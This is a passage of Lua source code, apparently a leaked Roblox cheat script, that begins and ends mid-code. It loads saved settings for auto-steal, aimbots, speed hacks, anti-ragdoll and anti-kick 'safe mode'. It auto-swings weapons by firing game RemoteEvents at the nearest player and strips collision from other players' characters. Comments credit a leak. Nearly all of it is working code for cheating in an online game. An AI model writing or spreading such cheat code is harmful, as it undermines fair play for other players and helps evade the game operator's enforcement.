laggerCarryActive = (currentSpeedMode == "Lagger Carry")
_G.SoundDropMode = (data.dropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"
if currentSpeedMode ~= "Normal" and currentSpeedMode ~= "Carry" and currentSpeedMode ~= "Lagger" and currentSpeedMode ~= "Lagger Carry" then currentSpeedMode = "Normal" end
carrySpeedActive = (currentSpeedMode == "Carry")
laggerModeEnabled = (currentSpeedMode == "Lagger")
laggerCarryActive = (currentSpeedMode == "Lagger Carry")
autoCarrySpeedEnabled = data.autoCarrySpeedEnabled == true
autoTPEnabled = data.autoTPEnabled == true
autoTPHeight = tonumber(data.autoTPHeight) or autoTPHeight
infJumpEnabled = data.infJumpEnabled == true
_G.SoundInfJumpMode = (data.infJumpMode == "Hold") and "Hold" or "Tap"
antiRagdollEnabled = data.antiRagdollEnabled == true
_G.SoundAntiRagdollMode = (data.antiRagdollMode == "V2") and "V2" or "V1"
_G.SoundAntiVoidEnabled = data.antiVoidEnabled == true
_G.SoundAntiResetEnabled = data.antiResetEnabled == true
_G.SoundAntiE01Enabled = data.antiE01Enabled == true
_G.SoundAntiDropEnabled = data.antiDropEnabled == true
do
    local pbScale = tonumber(data.stealUiScaleValue) or tonumber(data.aceProgressBarScaleValue)
    if pbScale then
        aceProgressBarScaleValue = pbScale
        _G.SoundProgressBarScaleValue = pbScale
    end
    local guiScale = tonumber(data.guiScaleValue) or tonumber(data.aceGuiScaleValue)
    if guiScale then
        aceGuiScaleValue = guiScale
        _G.SoundGuiScaleValue = guiScale
    end
end
selectedAnimationPack = data.selectedAnimationPack or selectedAnimationPack
_G.SoundSelectedMoreAnimationBundle = data.selectedMoreAnimationBundle
selectedStealMode = data.selectedStealMode or selectedStealMode
if selectedStealMode == "Auto Steal V3" then selectedStealMode = "Auto Steal V3" end
if selectedStealMode ~= "Semi" then selectedStealMode = "Auto Steal V3" end
autoStealEnabled = data.autoStealEnabled == true
if type(data.aceStealRadii) == "table" then
_G.SoundStealRadii["Auto Steal V3"] = tonumber(
    data.aceStealRadii["Auto Steal V3"]
    or data.aceStealRadii.Normal
    or data.autoStealV3Radius
) or _G.SoundStealRadii["Auto Steal V3"] or 63
_G.SoundStealRadii.Semi = tonumber(data.aceStealRadii.Semi) or _G.SoundStealRadii.Semi or 9
end
autoStealRadius = tonumber(data.autoStealRadius) or autoStealRadius
_G.SoundStealRadii = _G.SoundStealRadii or {["Auto Steal V3"] = 63, Semi = 9}

if selectedStealMode == "Auto Steal V3" then
    autoStealRadius = tonumber(
        data.autoStealV3Radius
        or _G.SoundStealRadii["Auto Steal V3"]
        or autoStealRadius
        or 63
    ) or 63
    _G.SoundStealRadii["Auto Steal V3"] = autoStealRadius
else
    autoStealRadius = tonumber(_G.SoundStealRadii.Semi) or 9
end
selectedAimbotMode = "Normal"
AIMBOT_SPEED = tonumber(data.AIMBOT_SPEED) or AIMBOT_SPEED
LAGGER_AIMBOT_SPEED = tonumber(data.LAGGER_AIMBOT_SPEED) or LAGGER_AIMBOT_SPEED
_G.SoundAntiBypassAimbotSpeed = tonumber(data.ANTI_BYPASS_AIMBOT_SPEED) or _G.SoundAntiBypassAimbotSpeed or 58
if data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED == nil or tonumber(data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED) == 58 then
_G.SoundAntiBypassLaggerAimbotSpeed = 40
else
_G.SoundAntiBypassLaggerAimbotSpeed = tonumber(data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED) or 40
end
ANTI_DESYNC_AIMBOT_SPEED = tonumber(data.ANTI_DESYNC_AIMBOT_SPEED) or ANTI_DESYNC_AIMBOT_SPEED or 58
autoSwingEnabled = data.autoSwingEnabled == true
mirrorTPDownEnabled = data.mirrorTPDownEnabled == true
_G.SoundNormalAimbotOn = data.normalAimbotEnabled == true
_G.SoundAntiBypassAimbotOn = data.antiBypassAimbotEnabled == true
antiDesyncAutoSwingEnabled = data.antiDesyncAutoSwingEnabled == true
_G.SoundAntiDesyncAimbotOn = false
_G.SoundAntiTpBatEnabled = false
batCounterEnabled = data.batCounterEnabled == true
medCounterEnabled = data.medCounterEnabled == true
hardHitEnabled = data.hardHitEnabled == true
hardHitRadius = tonumber(data.hardHitRadius) or 10
_G.SoundHardHitRadius = hardHitRadius
if _G.SoundHardHitState then _G.SoundHardHitState.radius = hardHitRadius end
perfectHitEnabled = data.perfectHitEnabled == true
perfectHitRange = tonumber(data.perfectHitRange) or 175
if _G.SoundPerfectHitState then _G.SoundPerfectHitState.range = perfectHitRange end
antiKickEnabled = data.safeMode == true
autoResetOnMedEnabled = data.autoResetOnMedEnabled == true
espEnabled = false
espLineEnabled = data.espLineEnabled == true
showTracerEnabled = false
ragdollCountdownEnabled = true
fpsBoostEnabled = data.fpsBoostEnabled == true
antiLagVisualEnabled = data.antiLagVisualEnabled == true
nukeOptimiserEnabled = data.nukeOptimiserEnabled == true
fovEnabled = data.fovEnabled == true
fovValue = tonumber(data.fovValue) or fovValue
noCamCollisionEnabled = data.noCamCollisionEnabled == true
_G.SoundNoPlayerCollisionEnabled = data.noPlayerCollisionEnabled == true
_G.SoundCustomFontSelected = (type(data.customFontSelected) == "string" and data.customFontSelected) or "None"
customFontVisualEnabled = _G.SoundCustomFontSelected ~= "None"
skyTheme = (type(data.skyTheme) == "string" and data.skyTheme) or skyTheme
autoLeftEnabled = data.autoLeftEnabled == true
autoRightEnabled = data.autoRightEnabled == true
_introEnabled = false
if data.selectedIntroMusic and ADAPT_INTRO_MUSIC_OPTIONS[data.selectedIntroMusic] then
selectedIntroMusic = data.selectedIntroMusic
else
selectedIntroMusic = 1
end
if autoLeftEnabled and autoRightEnabled then autoRightEnabled = false end
end
loadSoundConfig()

-- Re-apply Anti Toggles after config load (fixes re-execute with toggles saved on)
task.defer(function()
    pcall(function()
        if _G.SoundAntiVoidEnabled == true and type(_G.SoundAntiVoidSet) == "function" then
            _G.SoundAntiVoidSet(true)
        end
    end)
    pcall(function()
        if _G.SoundAntiResetEnabled == true and type(_G.SoundSetAntiReset) == "function" then
            _G.SoundSetAntiReset(true)
        end
    end)
    pcall(function()
        if _G.SoundAntiE01Enabled == true and type(_G.SoundSetAntiE01) == "function" then
            _G.SoundSetAntiE01(true)
        end
    end)
    pcall(function()
        if _G.SoundAntiDropEnabled == true and type(_G.SoundSetAntiDrop) == "function" then
            _G.SoundSetAntiDrop(true)
        end
    end)
end)

local function syncAnimationPackIndex()
for i, name in ipairs(AnimationPackList) do
if name == selectedAnimationPack then
AnimationPackIndex = i
return
end
end
selectedAnimationPack = "OFF"
AnimationPackIndex = 1
end
local function applySavedAnimationPackToCharacter(char)
syncAnimationPackIndex()
if refreshAnimationPackRow then pcall(refreshAnimationPackRow) end
if not char then char = LP.Character end
if not char then return end
local animate = char:FindFirstChild("Animate") or char:WaitForChild("Animate", 6)
if not animate then return end
task.wait(0.2)
OriginalAnims = {}
unwalkSavedAnimate = nil
if selectedAnimationPack and selectedAnimationPack ~= "OFF" then
    pcall(function() applyAnimationPack(selectedAnimationPack) end)
elseif _G.SoundSelectedMoreAnimationBundle and applyFullAnimationBundle then
    --Leaked By Xlu0 AndPrime--
    task.wait(0.15)
    pcall(function()
        applyFullAnimationBundle(_G.SoundSelectedMoreAnimationBundle)
    end)
else
    pcall(function() resetAnimations() end)
end
end
syncAnimationPackIndex()
task.defer(function()
applySavedAnimationPackToCharacter(LP.Character)
end)
LP.CharacterAdded:Connect(function(char)
task.wait(0.65)
task.defer(function()
task.wait(0.2)
_G.SoundApplyCharacterVisuals(char)
end)
if _G.SoundAntiVoidEnabled then pcall(_G.SoundAntiVoidSaveSafe) end
applySavedAnimationPackToCharacter(char)

--Leaked By Xlu0 AndPrime--
if _G.SoundSelectedMoreAnimationBundle then
    task.delay(1.25, function()
        if char == LP.Character and char.Parent and applyFullAnimationBundle then
            pcall(function()
                applyFullAnimationBundle(_G.SoundSelectedMoreAnimationBundle)
            end)
        end
    end)
end
end)
_G.SoundAutoResetOnMed = _G.SoundAutoResetOnMed or {}
_G.SoundAutoResetOnMed.conns = _G.SoundAutoResetOnMed.conns or {}
_G.SoundAutoResetOnMed.enabled = autoResetOnMedEnabled == true
_G.SoundAutoResetOnMed.medTriggered = false
_G.SoundAutoResetOnMed.lastFire = _G.SoundAutoResetOnMed.lastFire or 0
_G.SoundAutoResetOnMed.cooldown = 2.25
_G.SoundAutoResetOnMed.charAddedConn = _G.SoundAutoResetOnMed.charAddedConn

function _G.SoundAutoResetShouldFire(part)
local state = _G.SoundAutoResetOnMed
if not state or not state.enabled then return false end
if state.medTriggered then return false end
if tick() - (state.lastFire or 0) < (state.cooldown or 2.25) then return false end
if not part or not part.Parent then return false end
if part:FindFirstAncestorOfClass("Tool") or part:FindFirstAncestorOfClass("Accessory") then
return false
end
return part.Anchored and part.Transparency == 1
end
function _G.SoundAutoResetFireOnce(part)
if not _G.SoundAutoResetShouldFire(part) then return end
local state = _G.SoundAutoResetOnMed
state.medTriggered = true
state.lastFire = tick()
task.delay(2.3, function()
if state.enabled then
end
end)
end
function _G.SoundAutoResetOnAnchorChanged(part)
return part:GetPropertyChangedSignal("Anchored"):Connect(function()
_G.SoundAutoResetFireOnce(part)
end)
end
function _G.SoundStopAutoResetOnMed()
local state = _G.SoundAutoResetOnMed
if not state then return end
for _, conn in ipairs(state.conns or {}) do
pcall(function()
conn:Disconnect()
end)
end
state.conns = {}
state.medTriggered = false
end
function _G.SoundStartAutoResetOnMed(char)
local state = _G.SoundAutoResetOnMed
if not state then return end
_G.SoundStopAutoResetOnMed()
state.medTriggered = false
char = char or LP.Character
if not char then return end
for _, part in ipairs(char:GetDescendants()) do
if part:IsA("BasePart") then
table.insert(state.conns, _G.SoundAutoResetOnAnchorChanged(part))
_G.SoundAutoResetFireOnce(part)
end
end
table.insert(state.conns, char.DescendantAdded:Connect(function(part)
if part:IsA("BasePart") then
table.insert(state.conns, _G.SoundAutoResetOnAnchorChanged(part))
_G.SoundAutoResetFireOnce(part)
end
end))
table.insert(state.conns, char.AncestryChanged:Connect(function(_, parent)
if not parent then
state.medTriggered = false
end
end))
end
function _G.SoundEnableAutoResetOnMed()
autoResetOnMedEnabled = true
_G.SoundAutoResetOnMed.enabled = true
_G.SoundStartAutoResetOnMed(LP.Character)
end
function _G.SoundDisableAutoResetOnMed()
autoResetOnMedEnabled = false
_G.SoundAutoResetOnMed.enabled = false
_G.SoundStopAutoResetOnMed()
end
function _G.SoundSetAutoResetOnMed(state, noSave)
autoResetOnMedEnabled = state == true
if autoResetOnMedEnabled then
_G.SoundEnableAutoResetOnMed()
else
_G.SoundDisableAutoResetOnMed()
end
if setAutoResetOnMedVisual then
setAutoResetOnMedVisual(autoResetOnMedEnabled)
end
if not noSave and saveSoundConfig then do end end
end
function enableAutoResetOnMed()
_G.SoundSetAutoResetOnMed(true)
end
function disableAutoResetOnMed()
_G.SoundSetAutoResetOnMed(false)
end
function toggleAutoResetOnMed(on)
_G.SoundSetAutoResetOnMed(on == true)
end
if not _G.SoundAutoResetOnMed.charAddedConn then
_G.SoundAutoResetOnMed.charAddedConn = LP.CharacterAdded:Connect(function(char)
if _G.SoundAutoResetOnMed and _G.SoundAutoResetOnMed.enabled then
task.wait(0.25)
_G.SoundStartAutoResetOnMed(char)
end
end)
end
_G.SoundCounterState = _G.SoundCounterState or {}
_G.SoundCounterState.batConn = nil
_G.SoundCounterState.batDebounce = false
_G.SoundCounterState.medConns = _G.SoundCounterState.medConns or {}
_G.SoundCounterState.medDebounce = false
_G.SoundCounterState.medLastUsed = _G.SoundCounterState.medLastUsed or 0
_G.SoundMedusaCooldown = 25
function _G.SoundFindMedusa()
local c = LP.Character
if not c then return nil end
for _, t in ipairs(c:GetChildren()) do
if t:IsA("Tool") then
local n = t.Name:lower()
if n:find("medusa") or n:find("head") or n:find("stone") then return t end
end
end
local bp = LP:FindFirstChild("Backpack") or LP:FindFirstChildOfClass("Backpack")
if bp then
for _, t in ipairs(bp:GetChildren()) do
if t:IsA("Tool") then
local n = t.Name:lower()
if n:find("medusa") or n:find("head") or n:find("stone") then return t end
end
end
end
return nil
end
function _G.SoundUseMedusaCounter()
if not medCounterEnabled then return end
if _G.SoundCounterState.medDebounce then return end
if tick() - (_G.SoundCounterState.medLastUsed or 0) < _G.SoundMedusaCooldown then return end
local c = LP.Character
if not c then return end
_G.SoundCounterState.medDebounce = true
local med = _G.SoundFindMedusa()
if not med then
_G.SoundCounterState.medDebounce = false
return
end
if med.Parent ~= c then
local hum = c:FindFirstChildOfClass("Humanoid")
if hum then pcall(function() hum:EquipTool(med) end) end
task.wait(0.05)
end
pcall(function() med:Activate() end)
_G.SoundCounterState.medLastUsed = tick()
_G.SoundCounterState.medDebounce = false
end
function _G.SoundOnMedusaAnchorChanged(part)
return part:GetPropertyChangedSignal("Anchored"):Connect(function()
if medCounterEnabled and part.Anchored and part.Transparency == 1 then
_G.SoundUseMedusaCounter()
end
end)
end
function _G.SoundStartMedCounter(char)
_G.SoundStopMedCounter()
char = char or LP.Character
if not char then return end
for _, part in ipairs(char:GetDescendants()) do
if part:IsA("BasePart") then
table.insert(_G.SoundCounterState.medConns, _G.SoundOnMedusaAnchorChanged(part))
end
end
table.insert(_G.SoundCounterState.medConns, char.DescendantAdded:Connect(function(part)
if part:IsA("BasePart") then
table.insert(_G.SoundCounterState.medConns, _G.SoundOnMedusaAnchorChanged(part))
end
end))
end
function _G.SoundStopMedCounter()
for _, c in pairs(_G.SoundCounterState.medConns or {}) do
pcall(function() c:Disconnect() end)
end
_G.SoundCounterState.medConns = {}
_G.SoundCounterState.medDebounce = false
end
_G.SoundBatCounterSlapList = {"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap", "Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap", "Nuclear Slap", "Galaxy Slap", "Glitched Slap"}
function _G.SoundFindBatForCounter()
local c = LP.Character
if not c then return nil end
local bp = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
for _, name in ipairs(_G.SoundBatCounterSlapList) do
local t = c:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
if t then return t end
end
for _, ch in ipairs(c:GetChildren()) do
if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
end
if bp then
for _, ch in ipairs(bp:GetChildren()) do
if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
end
end
return nil
end
function _G.SoundSwingBatForCounter(bat, char)
if not bat or not char then return end
local hum = char:FindFirstChildOfClass("Humanoid")
if bat.Parent ~= char then
if hum then pcall(function() hum:EquipTool(bat) end) end
task.wait(0.05)
end
local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
if remote and remote:IsA("RemoteEvent") then
pcall(function() remote:FireServer() end)
task.wait(0.15)
pcall(function() remote:FireServer() end)
else
pcall(function() bat:Activate() end)
task.wait(0.15)
pcall(function() bat:Activate() end)
end
end
function _G.SoundCounterIsRagdoll(hum)
if not hum then return false end
local st = hum:GetState()
return st == Enum.HumanoidStateType.Physics
or st == Enum.HumanoidStateType.Ragdoll
or st == Enum.HumanoidStateType.FallingDown
or hum.PlatformStand == true
end
function _G.SoundStartBatCounter()
if _G.SoundCounterState.batConn then return end
_G.SoundCounterState.batDebounce = false
_G.SoundCounterState.batConn = RunService.Heartbeat:Connect(function()
if not batCounterEnabled then return end
if _G.SoundCounterState.batDebounce then return end
local char = LP.Character
if not char then return end
local hum = char:FindFirstChildOfClass("Humanoid")
if not hum then return end
if _G.SoundCounterIsRagdoll(hum) then
_G.SoundCounterState.batDebounce = true
task.spawn(function()
local bat = _G.SoundFindBatForCounter()
if bat then _G.SoundSwingBatForCounter(bat, char) end
task.wait(0.5)
_G.SoundCounterState.batDebounce = false
end)
end
end)
end
function _G.SoundStopBatCounter()
if _G.SoundCounterState.batConn then
_G.SoundCounterState.batConn:Disconnect()
_G.SoundCounterState.batConn = nil
end
_G.SoundCounterState.batDebounce = false
end
startBatCounter = _G.SoundStartBatCounter
stopBatCounter = _G.SoundStopBatCounter
setupMedusaCounter = _G.SoundStartMedCounter
stopMedusaCounter = _G.SoundStopMedCounter

_G.SoundHardHitState = _G.SoundHardHitState or {
ring = nil,
conn = nil,
enabled = false,
radius = 10,
}
local HH = _G.SoundHardHitState
function _G.SoundHideHardHitRing()
if HH.ring then
pcall(function() HH.ring:Destroy() end)
HH.ring = nil
end
end
function _G.SoundShowHardHitRing()
local char = LP.Character
if not char then return end
local hrp = char:FindFirstChild("HumanoidRootPart")
if not hrp then return end
if HH.ring and HH.ring.Parent then return end
local cyl = Instance.new("CylinderHandleAdornment")
cyl.Name = "SoundHardHitRing"
cyl.Adornee = hrp
cyl.Color3 = Color3.fromRGB(255, 255, 255)
cyl.AlwaysOnTop = true
cyl.ZIndex = 5
cyl.Transparency = 0.25
local r = tonumber(HH.radius) or 10
cyl.Radius = r
cyl.InnerRadius = math.max(0.1, r - 0.35)
cyl.Height = 0.15
cyl.CFrame = CFrame.new(0, -3, 0)
cyl.Parent = hrp
HH.ring = cyl
end
function _G.SoundStartHardHit()
HH.enabled = true
hardHitEnabled = true
_G.SoundHardHitEnabled = true
if HH.conn then return end
HH.conn = RunService.Heartbeat:Connect(function()
if not HH.enabled then return end
local char = LP.Character
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
if not HH.ring or not HH.ring.Parent then
_G.SoundShowHardHitRing()
end
if HH.ring then
local r = tonumber(HH.radius) or 10
HH.ring.Radius = r
HH.ring.InnerRadius = math.max(0.1, r - 0.35)
if HH.ring.Adornee ~= root then
HH.ring.Adornee = root
HH.ring.Parent = root
end
end
end)
_G.SoundShowHardHitRing()
end
function _G.SoundStopHardHit()
HH.enabled = false
hardHitEnabled = false
_G.SoundHardHitEnabled = false
if HH.conn then
pcall(function() HH.conn:Disconnect() end)
HH.conn = nil
end
_G.SoundHideHardHitRing()
end
function _G.SoundSetHardHitRadius(v)
local n = tonumber(v)
if not n then return end
HH.radius = math.clamp(n, 1, 100)
hardHitRadius = HH.radius
_G.SoundHardHitRadius = HH.radius
if HH.ring then
HH.ring.Radius = HH.radius
HH.ring.InnerRadius = math.max(0.1, HH.radius - 0.35)
end
if saveSoundConfig then pcall(saveSoundConfig) end
end

_G.SoundPerfectHitState = _G.SoundPerfectHitState or {
enabled = false,
conn = nil,
cd = false,
range = 175,
}
local PH = _G.SoundPerfectHitState
function _G.SoundPerfectHitTryHit()
if not PH.enabled then return end
if PH.cd then return end
PH.cd = true
local char = LP.Character
if char then
local bat = _G.SoundFindBatForCounter and _G.SoundFindBatForCounter() or nil
if bat then
_G.SoundSwingBatForCounter(bat, char)
end
end
task.delay(0.045, function() PH.cd = false end)
end
function _G.SoundPerfectHitGetTarget()
local char = LP.Character
if not char then return nil end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return nil end
local nearest = nil
local shortest = math.huge
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
local tr = plr.Character:FindFirstChild("HumanoidRootPart")
local hum = plr.Character:FindFirstChildOfClass("Humanoid")
if tr and hum and hum.Health > 0 then
local d = (tr.Position - root.Position).Magnitude
if d <= (tonumber(PH.range) or 175) and d < shortest then
shortest = d
nearest = tr
end
end
end
end
return nearest
end
function _G.SoundStartPerfectHit()
PH.enabled = true
perfectHitEnabled = true
_G.SoundPerfectHitEnabled = true
if PH.conn then return end
PH.conn = RunService.Heartbeat:Connect(function()
if not PH.enabled then return end
local char = LP.Character
if not char then return end
local hum = char:FindFirstChildOfClass("Humanoid")
if not hum then return end
if _G.SoundCounterIsRagdoll then
if _G.SoundCounterIsRagdoll(hum) then return end
end
local target = _G.SoundPerfectHitGetTarget()
if target then
_G.SoundPerfectHitTryHit()
end
end)
end
function _G.SoundStopPerfectHit()
PH.enabled = false
perfectHitEnabled = false
_G.SoundPerfectHitEnabled = false
if PH.conn then
pcall(function() PH.conn:Disconnect() end)
PH.conn = nil
end
PH.cd = false
end
function _G.SoundSetPerfectHitRange(v)
local n = tonumber(v)
if not n then return end
PH.range = math.clamp(n, 10, 500)
perfectHitRange = PH.range
if saveSoundConfig then pcall(saveSoundConfig) end
end

_G.SoundNoPlayerCollisionState = _G.SoundNoPlayerCollisionState or {connections = {}}
function _G.SoundSetOtherPlayerCollision(state)
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
for _, part in ipairs(plr.Character:GetDescendants()) do
if part:IsA("BasePart") then
pcall(function() part.CanCollide = state end)
end
end
end
end
end
function enableNoPlayerCollision()
if _G.SoundNoPlayerCollisionState.running then return end
_G.SoundNoPlayerCollisionEnabled = true
_G.SoundNoPlayerCollisionState.running = true
for _, conn in ipairs(_G.SoundNoPlayerCollisionState.connections or {}) do
pcall(function() conn:Disconnect() end)
end
_G.SoundNoPlayerCollisionState.connections = {}
_G.SoundSetOtherPlayerCollision(false)
table.insert(_G.SoundNoPlayerCollisionState.connections, LP.CharacterAdded:Connect(function()
task.wait(0.5)
if _G.SoundNoPlayerCollisionEnabled then _G.SoundSetOtherPlayerCollision(false) end
end))
table.insert(_G.SoundNoPlayerCollisionState.connections, Players.PlayerAdded:Connect(function(plr)
local c = plr.CharacterAdded:Connect(function()
task.wait(0.5)
if _G.SoundNoPlayerCollisionEnabled then _G.SoundSetOtherPlayerCollision(false) end
end)
table.insert(_G.SoundNoPlayerCollisionState.connections, c)
end))
local collisionScanElapsed = 0
table.insert(_G.SoundNoPlayerCollisionState.connections, RunService.Heartbeat:Connect(function(dt)
if not _G.SoundNoPlayerCollisionEnabled then return end
collisionScanElapsed = collisionScanElapsed + (dt or 0)
if collisionScanElapsed < 0.25 then return end
collisionScanElapsed = 0
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
for _, part in ipairs(plr.Character:GetDescendants()) do
if part:IsA("BasePart") and part.CanCollide == true then
pcall(function() part.CanCollide = false end)
end
end
end
end
end))
end
function disableNoPlayerCollision()
if not _G.SoundNoPlayerCollisionState.running then
_G.SoundNoPlayerCollisionEnabled = false
return
end
_G.SoundNoPlayerCollisionEnabled = false
_G.SoundNoPlayerCollisionState.running = false
for _, conn in ipairs(_G.SoundNoPlayerCollisionState.connections or {}) do
pcall(function() conn:Disconnect() end)
end
_G.SoundNoPlayerCollisionState.connections = {}
_G.SoundSetOtherPlayerCollision(true)
end
function _G.SoundSafeModeGetCountdownLabel()
local ok, label = pcall(function()
return LP.PlayerGui
and LP.PlayerGui:FindFirstChild("DuelsMachineTopFrame")
and LP.PlayerGui.DuelsMachineTopFrame:FindFirstChild("DuelsMachineTopFrame")
and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame:FindFirstChild("Timer")
and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame.Timer:FindFirstChild("Label")
end)
return (ok and label) or nil
end
function _G.SoundSafeModeCountdownNumber(text)
local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
if t == "GO" or t == "START" or t == "READY" then return true end
local n = tonumber(t)
return n ~= nil and n >= 0 and n <= 10
end
function _G.SoundSafeModeInDuelCountdown()
local label = _G.SoundSafeModeGetCountdownLabel()
return label and _G.SoundSafeModeCountdownNumber(label.Text) or false
end
_G.SoundSafeModeBlockedTools = {
bat=true, slap=true, sword=true, gun=true, pistol=true, rifle=true,
medusa=true, hammer=true, axe=true, knife=true, katana=true, blade=true, fist=true,
}
function _G.SoundSafeModeIsCarryableTool(tool)
if not tool or not tool:IsA("Tool") then return false end
local name = tool.Name:lower()
for word in pairs(_G.SoundSafeModeBlockedTools) do
if name:find(word, 1, true) then return false end
end
return true
end
function _G.SoundSafeModeHoldingBrainrot()
local ok, val = pcall(function() return LP:GetAttribute("Stealing") end)
if ok and val == true then return true end
local ok2, val2 = pcall(function() return LP:GetAttribute("AntiKick") end)
if ok2 and val2 == true then return true end
local char = LP.Character
if not char then return false end
local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
if ok3 and val3 == true then return true end
if _G.AutoCarrySpeed and type(_G.AutoCarrySpeed.IsCarryingBrainrot) == "function" then
local okCarry, carrying = pcall(function() return _G.AutoCarrySpeed.IsCarryingBrainrot(char) end)
if okCarry and carrying then return true end
end
for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
local v = char:FindFirstChild(name, true)
if v then
if v:IsA("BoolValue") and v.Value then return true end
if v:IsA("ObjectValue") and v.Value then return true end
if v:IsA("StringValue") and v.Value ~= "" then return true end
end
end
for _, child in ipairs(char:GetChildren()) do
if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
local n = child.Name:lower()
if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
return true
end
end
end
return false
end
function _G.SoundSafeModeIsLocked()
if not antiKickEnabled then return false end
return _G.SoundSafeModeInDuelCountdown() or _G.SoundSafeModeHoldingBrainrot()
end
function _G.SoundSafeModeForceStop(reason)
local stopped = false
if _G.SoundNormalAimbotOn and _G.SoundStopNormalAimbot then _G.SoundStopNormalAimbot(); stopped = true end
if _G.SoundAntiBypassAimbotOn and _G.SoundStopAntiBypassAimbot then _G.SoundStopAntiBypassAimbot(false); stopped = true end
if _G.SoundAntiDesyncAimbotOn and _G.SoundStopAntiDesyncAimbot then _G.SoundStopAntiDesyncAimbot(); stopped = true end
if autoLeftEnabled then
autoLeftEnabled = false
if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
if _G.SoundStopAutoLeft then _G.SoundStopAutoLeft() end
stopped = true
end
if autoRightEnabled then
autoRightEnabled = false
if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
if _G.SoundStopAutoRight then _G.SoundStopAutoRight() end
stopped = true
end
if stopped and showActionNotification then pcall(function() showActionNotification(reason or "SAFE MODE LOCK") end) end
end
function _G.SoundSafeModeTryStart()
if _G.SoundSafeModeIsLocked and _G.SoundSafeModeIsLocked() then
_G.SoundSafeModeForceStop("SAFE MODE LOCK")
return false
end
return true
end
_G.SoundSafeModeMonitorStarted = _G.SoundSafeModeMonitorStarted or false
if not _G.SoundSafeModeMonitorStarted then
_G.SoundSafeModeMonitorStarted = true
RunService.Heartbeat:Connect(function()
if antiKickEnabled and _G.SoundSafeModeIsLocked and _G.SoundSafeModeIsLocked() then
_G.SoundSafeModeForceStop("SAFE MODE LOCK")
end
end)
end
LP.CharacterAdded:Connect(function(char)
task.wait(0.5)
if medCounterEnabled then _G.SoundStartMedCounter(char) end
if batCounterEnabled then _G.SoundStartBatCounter() end
if hardHitEnabled then _G.SoundStartHardHit() end
if perfectHitEnabled then _G.SoundStartPerfectHit() end
end)
_G.SoundNormalAimbot = _G.SoundNormalAimbot or {conn = nil, target = nil, swingCooldown = false}
function _G.SoundFindAimbotBat()
local char = LP.Character
if not char then return nil end
for _, tool in ipairs(char:GetChildren()) do
if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
return tool
end
end
local bp = LP:FindFirstChild("Backpack")
if bp then
for _, tool in ipairs(bp:GetChildren()) do
if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
return tool
end
end
end
return nil
end
function _G.SoundGetClosestAimbotTarget()
local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
if not root then return nil end
local closest, minDist = nil, math.huge
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
local hum = plr.Character:FindFirstChildOfClass("Humanoid")
if tRoot and hum and hum.Health > 0 then
local dist = (tRoot.Position - root.Position).Magnitude
if dist < minDist then
minDist = dist
closest = tRoot
end
end
end
end
return closest
end
function _G.SoundGetNormalAimbotSpeed()
if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
return tonumber(LAGGER_AIMBOT_SPEED) or 40
end
return tonumber(AIMBOT_SPEED) or 58
end
function _G.SoundGetAntiBypassAimbotSpeed()
if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
return tonumber(_G.SoundAntiBypassLaggerAimbotSpeed) or 40
end
return tonumber(_G.SoundAntiBypassAimbotSpeed) or 58
end
function _G.SoundGetSelectedAimbotSpeedValues()
if selectedAimbotMode == "Anti Bypass" then
return tonumber(_G.SoundAntiBypassAimbotSpeed) or 58, tonumber(_G.SoundAntiBypassLaggerAimbotSpeed) or 40
end
return tonumber(AIMBOT_SPEED) or 58, tonumber(LAGGER_AIMBOT_SPEED) or 40
end
function _G.SoundSetSelectedAimbotSpeedValues(normalValue, laggerValue)
if selectedAimbotMode == "Anti Bypass" then
if normalValue then _G.SoundAntiBypassAimbotSpeed = normalValue end
if laggerValue then _G.SoundAntiBypassLaggerAimbotSpeed = laggerValue end
else
if normalValue then AIMBOT_SPEED = normalValue end
if laggerValue then LAGGER_AIMBOT_SPEED = laggerValue end
end
end
function _G.SoundRefreshAimbotSpeedBoxes()
local n, l = _G.SoundGetSelectedAimbotSpeedValues()
if _G.SoundAimbotSpeedBox then _G.SoundAimbotSpeedBox.Text = tostring(n) end
if _G.SoundLaggerAimbotSpeedBox then _G.SoundLaggerAimbotSpeedBox.Text = tostring(l) end
end

_G.SoundNormalAimbot = _G.SoundNormalAimbot or {
    conn = nil,
    target = nil,
    lastScan = 0,
    attachment = nil,
    linearVelocity = nil,
}

local function _SoundAimbotEnsureLinearVelocity(root)
    local S = _G.SoundNormalAimbot

    if S.linearVelocity
        and S.linearVelocity.Parent
        and S.attachment
        and S.attachment.Parent == root then
        S.linearVelocity.Enabled = true
